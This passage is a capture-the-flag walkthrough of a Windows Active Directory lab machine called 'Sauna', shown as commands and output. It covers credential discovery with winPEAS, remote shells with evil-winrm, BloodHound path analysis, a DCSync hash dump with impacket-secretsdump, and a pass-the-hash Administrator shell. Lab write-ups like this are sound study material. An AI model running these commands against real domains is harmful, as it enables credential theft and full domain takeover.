egotisticalbank\fsmith S-1-5-21-2966785786-3096785034-1186376766-1105


GROUP INFORMATION
-----------------

Group Name                                  Type             SID          Attributes
=========================================== ================ ============ ==================================================
Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

`cd C:\\Users\fsmith\Desktop`

`dir`:
```
    Directory: C:\Users\fsmith\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---       11/20/2024   2:53 PM             34 user.txt
```

`type user.txt`:
```
d1591***************************🚩
```

`cd C:\\Users\fsmith\appdata\local\temp`

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`locate -i 'winpeas.exe'`:
```
/home/kali/tools/SharpCollection/NetFramework_4.0_x64/winPEAS.exe
/home/kali/tools/SharpCollection/NetFramework_4.0_x86/winPEAS.exe
/home/kali/tools/SharpCollection/NetFramework_4.5_Any/winPEAS.exe
/home/kali/tools/SharpCollection/NetFramework_4.5_x64/winPEAS.exe
/home/kali/tools/SharpCollection/NetFramework_4.5_x86/winPEAS.exe
/home/kali/tools/SharpCollection/NetFramework_4.7_Any/winPEAS.exe
/home/kali/tools/SharpCollection/NetFramework_4.7_x64/winPEAS.exe
/home/kali/tools/SharpCollection/NetFramework_4.7_x86/winPEAS.exe
```

`cp /home/kali/tools/SharpCollection/NetFramework_4.7_Any/winPEAS.exe ./winpeas.exe`

`upload ./winpeas.exe`:
```
Info: Uploading /home/kali/winpeas.exe to C:\Users\fsmith\appdata\local\temp\winpeas.exe
                                        
Data: 2549076 bytes of 2549076 bytes copied
                                        
Info: Upload successful!
```

![Victim: fsmith](https://custom-icon-badges.demolab.com/badge/Victim-fsmith-64b5f6?logo=windows11&logoColor=white)

`.\winpeas.exe`:
```
[...]

ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Users Information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

[...]

ÉÍÍÍÍÍÍÍÍÍÍ¹ Display information about local users
   Computer Name           :   SAUNA
   User Name               :   Administrator
   User Id                 :   500
   Is Enabled              :   True
   User Type               :   Administrator
   Comment                 :   Built-in account for administering the computer/domain
   Last Logon              :   11/20/2024 2:53:42 PM
   Logons Count            :   112
   Password Last Set       :   7/26/2021 8:16:16 AM

   =================================================================================================

   Computer Name           :   SAUNA
   User Name               :   Guest
   User Id                 :   501
   Is Enabled              :   False
   User Type               :   Guest
   Comment                 :   Built-in account for guest access to the computer/domain
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   1/1/1970 12:00:00 AM

   =================================================================================================

   Computer Name           :   SAUNA
   User Name               :   krbtgt
   User Id                 :   502
   Is Enabled              :   False
   User Type               :   User
   Comment                 :   Key Distribution Center Service Account
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   1/22/2020 9:45:30 PM

   =================================================================================================

   Computer Name           :   SAUNA
   User Name               :   HSmith
   User Id                 :   1103
   Is Enabled              :   True
   User Type               :   User
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   1/22/2020 9:54:34 PM

   =================================================================================================

   Computer Name           :   SAUNA
   User Name               :   FSmith
   User Id                 :   1105
   Is Enabled              :   True
   User Type               :   User
   Comment                 :
   Last Logon              :   11/21/2024 1:55:42 PM
   Logons Count            :   11
   Password Last Set       :   1/23/2020 8:45:19 AM

   =================================================================================================

   Computer Name           :   SAUNA
   User Name               :   svc_loanmgr👤
   User Id                 :   1108
   Is Enabled              :   True
   User Type               :   User
   Comment                 :
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   1/24/2020 3:48:31 PM

   =================================================================================================

[...]

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for AutoLogon credentials
    Some AutoLogon credentials were found
    DefaultDomainName             :  EGOTISTICALBANK
    DefaultUserName               :  EGOTISTICALBANK\svc_loanmanager
    DefaultPassword               :  Moneymakestheworldgoround!🔑

[...]
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`netexec smb 10.10.10.175 -u 'svc_loanmgr' -p 'Moneymakestheworldgoround!'`:
```
SMB         10.10.10.175    445    SAUNA            [*] Windows 10 / Server 2019 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.175    445    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\svc_loanmgr:Moneymakestheworldgoround!🔑
```

`netexec winrm 10.10.10.175 -u 'svc_loanmgr' -p 'Moneymakestheworldgoround!'`:
```
WINRM       10.10.10.175    5985   SAUNA            [*] Windows 10 / Server 2019 Build 17763 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL)
WINRM       10.10.10.175    5985   SAUNA            [+] EGOTISTICAL-BANK.LOCAL\svc_loanmgr:Moneymakestheworldgoround! (Pwn3d!)🚀
```

`evil-winrm -i 10.10.10.175 -u 'svc_loanmgr' -p 'Moneymakestheworldgoround!'`:
```
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents> 
```
🐚

![Victim: svc_loanmgr](https://custom-icon-badges.demolab.com/badge/Victim-svc%5F_loanmgr-64b5f6?logo=windows11&logoColor=white)

`whoami`:
```
egotisticalbank\svc_loanmgr
```

`whoami /all`:
```
USER INFORMATION
----------------

User Name                   SID
=========================== ==============================================
egotisticalbank\svc_loanmgr S-1-5-21-2966785786-3096785034-1186376766-1108


GROUP INFORMATION
-----------------

Group Name                                  Type             SID          Attributes
=========================================== ================ ============ ==================================================
Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

`net.exe user`:
```
User accounts for \\

-------------------------------------------------------------------------------
Administrator            FSmith                   Guest
HSmith👤                 krbtgt                   svc_loanmgr
The command completed with one or more errors.
```

`net.exe user hsmith`:
```
User name                    HSmith
Full Name                    Hugo Smith
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/22/2020 9:54:34 PM
Password expires             Never
Password changeable          1/23/2020 9:54:34 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Users
The command completed successfully.
```

`cd C:\\Users\svc_loanmgr\appdata\local\temp`

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`locate -i 'sharphound.exe'`:
```
/home/kali/tools/SharpCollection/NetFramework_4.5_Any/SharpHound.exe
/home/kali/tools/SharpCollection/NetFramework_4.5_x64/SharpHound.exe
/home/kali/tools/SharpCollection/NetFramework_4.5_x86/SharpHound.exe
/home/kali/tools/SharpCollection/NetFramework_4.7_Any/SharpHound.exe
/home/kali/tools/SharpCollection/NetFramework_4.7_x64/SharpHound.exe
/home/kali/tools/SharpCollection/NetFramework_4.7_x86/SharpHound.exe
/usr/lib/bloodhound/resources/app/Collectors/SharpHound.exe
/usr/lib/bloodhound/resources/app/Collectors/DebugBuilds/SharpHound.exe
/usr/share/metasploit-framework/data/post/SharpHound.exe
```

`cp /home/kali/tools/SharpCollection/NetFramework_4.7_Any/SharpHound.exe ./sharphound.exe`

`upload ./sharphound.exe`:
```
Info: Uploading /home/kali/sharphound.exe to C:\Users\svc_loanmgr\appdata\local\temp\sharphound.exe
                                        
Data: 965288 bytes of 965288 bytes copied
                                        
Info: Upload successful!
```

![Victim: svc_loanmgr](https://custom-icon-badges.demolab.com/badge/Victim-svc%5F_loanmgr-64b5f6?logo=windows11&logoColor=white)

`.\sharphound.exe`:
```
2024-11-21T15:04:54.7028867-08:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2024-11-21T15:04:54.7185078-08:00|INFORMATION|Initializing SharpHound at 3:04 PM on 11/21/2024
2024-11-21T15:04:54.8278744-08:00|INFORMATION|[CommonLib LDAPUtils]Found usable Domain Controller for EGOTISTICAL-BANK.LOCAL : SAUNA.EGOTISTICAL-BANK.LOCAL
2024-11-21T15:05:06.8591282-08:00|INFORMATION|Flags: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2024-11-21T15:05:06.9685000-08:00|INFORMATION|Beginning LDAP search for EGOTISTICAL-BANK.LOCAL
2024-11-21T15:05:06.9841308-08:00|INFORMATION|Producer has finished, closing LDAP channel
2024-11-21T15:05:06.9841308-08:00|INFORMATION|LDAP channel closed, waiting for consumers
2024-11-21T15:05:37.8903902-08:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 35 MB RAM
2024-11-21T15:06:04.7341243-08:00|INFORMATION|Consumers finished, closing output channel
2024-11-21T15:06:04.7653764-08:00|INFORMATION|Output channel closed, waiting for output task to complete
Closing writers
2024-11-21T15:06:05.0466339-08:00|INFORMATION|Status: 94 objects finished (+94 1.62069)/s -- Using 42 MB RAM
2024-11-21T15:06:05.0466339-08:00|INFORMATION|Enumeration finished in 00:00:58.0951365
2024-11-21T15:06:05.1091304-08:00|INFORMATION|Saving cache with stats: 53 ID to type mappings.
 53 name to SID mappings.
 0 machine sid mappings.
 2 sid to domain mappings.
 0 global catalog mappings.
2024-11-21T15:06:05.1247546-08:00|INFORMATION|SharpHound Enumeration Completed at 3:06 PM on 11/21/2024! Happy Graphing!
```

`dir`:
```
    Directory: C:\Users\svc_loanmgr\appdata\local\temp


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       11/21/2024   3:06 PM          11607 20241121150604_BloodHound.zip
-a----       11/21/2024   2:57 PM         723968 sharphound.exe
-a----       11/21/2024   3:06 PM           8601 ZDFkMDEyYjYtMmE1ZS00YmY3LTk0OWItYTM2OWVmMjc5NDVk.bin
```

`move 20241121150604_BloodHound.zip bloodhound.zip`

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`download bloodhound.zip`:
```
Info: Downloading C:\Users\svc_loanmgr\appdata\local\temp\bloodhound.zip to bloodhound.zip
                                        
Info: Download successful!
```

`sudo neo4j console`

`bloodhound`

`Database Info` > `Refresh Database Stats`
`Database Info` > `Clear Sessions`
`Database Info` > `Clear Database`

`Upload Data: ~/bloddhound.zip` > `Clear Finished`

`Search for a node: svc_loanmgr` > `SVC_LOANMGR@EGOTISTICAL-BANK.LOCAL` > `<right-click>` > `Mark User as Owned`

`Analysis` > `Shortest Paths` > `Shortest Paths from Owned Principals` > `Select a domain: EGOTISTICAL-BANK.LOCAL` > `Select a user: SVC_LOANMGR@EGOTISTICAL-BANK.LOCAL` 

`Analysis` > `Shortest Paths` > `Find Shortest Paths to Domain Admins` > `Select a Domain Admin group: DOMAIN ADMINS@EGOTISTICAL-BANK.LOCAL` 

`Analysis` > `Dangerous Privileges` > `Find Principals with DCSync Rights` > `Select a Domain: EGOTISTICAL-BANK.LOCAL` 

`Graph`:
```
SVC_LOANMGR ---(DCSync)--- EGOTISTICAL-BANK.LOCAL
```

`DCSync`:
```
INFO:

The user SVC_LOANMGR@EGOTISTICAL-BANK.LOCAL has the DS-Replication-Get-Changes and the DS-Replication-Get-Changes-All privilege on the domain EGOTISTICAL-BANK.LOCAL.

These two privileges allow a principal to perform a DCSync attack.

WINDOWS ABUSE:

You may perform a dcsync attack to get the password hash of an arbitrary principal using mimikatz:
~~~
lsadump::dcsync /domain:testlab.local /user:Administrator
~~~

You can also perform the more complicated ExtraSids attack to hop domain trusts. For information on this see the blog post by harmj0y in the references tab.
```

`impacket-secretsdump 'egotistical-bank.local/svc_loanmgr:Moneymakestheworldgoround!@10.10.10.175'`:
```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::🔑
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:97818ba2fdc7b3defae0d0375aa00264:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:42ee4a7abee32410f470fed37ae9660535ac56eeb73928ec783b015d623fc657
Administrator:aes128-cts-hmac-sha1-96:a9f3769c592a8a231c3c972c4050be4e
Administrator:des-cbc-md5:fb8f321c64cea87f
krbtgt:aes256-cts-hmac-sha1-96:83c18194bf8bd3949d4d0d94584b868b9d5f2a54d3d6f3012fe0921585519f24
krbtgt:aes128-cts-hmac-sha1-96:c824894df4c4c621394c079b42032fa9
krbtgt:des-cbc-md5:c170d5dc3edfc1d9
EGOTISTICAL-BANK.LOCAL\HSmith:aes256-cts-hmac-sha1-96:5875ff00ac5e82869de5143417dc51e2a7acefae665f50ed840a112f15963324
EGOTISTICAL-BANK.LOCAL\HSmith:aes128-cts-hmac-sha1-96:909929b037d273e6a8828c362faa59e9
EGOTISTICAL-BANK.LOCAL\HSmith:des-cbc-md5:1c73b99168d3f8c7
EGOTISTICAL-BANK.LOCAL\FSmith:aes256-cts-hmac-sha1-96:8bb69cf20ac8e4dddb4b8065d6d622ec805848922026586878422af67ebd61e2
EGOTISTICAL-BANK.LOCAL\FSmith:aes128-cts-hmac-sha1-96:6c6b07440ed43f8d15e671846d5b843b
EGOTISTICAL-BANK.LOCAL\FSmith:des-cbc-md5:b50e02ab0d85f76b
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes256-cts-hmac-sha1-96:6f7fd4e71acd990a534bf98df1cb8be43cb476b00a8b4495e2538cff2efaacba
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes128-cts-hmac-sha1-96:8ea32a31a1e22cb272870d79ca6d972c
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:des-cbc-md5:2a896d16c28cf4a2
SAUNA$:aes256-cts-hmac-sha1-96:f53d6d4ed5199679d6a26da1806e5d26cdca7bb7623dc71debc1a773c8ce8d0a
SAUNA$:aes128-cts-hmac-sha1-96:b4725ed260b4d6d1c126293c94088f1b
SAUNA$:des-cbc-md5:104c515b86739e08
[*] Cleaning up...
```

`netexec wmi 10.10.10.175 -u 'Administrator' -H '823452073d75b9d1cf70ebdf86c7f98e'`:
```
SMB         10.10.10.175    445    SAUNA            [*] Windows 10 / Server 2019 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.175    445    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\Administrator:823452073d75b9d1cf70ebdf86c7f98e (Pwn3d!)🚀
```

`netexec smb 10.10.10.175 -u 'Administrator' -H '823452073d75b9d1cf70ebdf86c7f98e' -x 'whoami'`:
```
SMB         10.10.10.175    445    SAUNA            [*] Windows 10 / Server 2019 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.175    445    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\Administrator:823452073d75b9d1cf70ebdf86c7f98e (Pwn3d!)
SMB         10.10.10.175    445    SAUNA            [+] Executed command via wmiexec
SMB         10.10.10.175    445    SAUNA            egotisticalbank\administrator
```

`impacket-wmiexec 'egotistical-bank.local/Administrator@10.10.10.175' -hashes ':823452073d75b9d1cf70ebdf86c7f98e'`:
```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>
```
🐚

![Victim: administrator](https://custom-icon-badges.demolab.com/badge/Victim-administrator-64b5f6?logo=windows11&logoColor=white)

`whoami`:
```
egotisticalbank\administrator
```

`cd C:\\Users\Administrator\Desktop`

`dir`:
```
 Volume in drive C has no label.
 Volume Serial Number is 489C-D8FC

 Directory of C:\Users\Administrator\Desktop

07/14/2021  02:35 PM    <DIR>          .
07/14/2021  02:35 PM    <DIR>          ..
11/20/2024  02:53 PM                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   6,237,208,576 bytes free
```

`type root.txt`:
```
63e6b***************************🚩
```

<img src="https://hackmyvm.eu/img/correctflag.png" alt="Machine Hacked!" width="150"/>

---
---
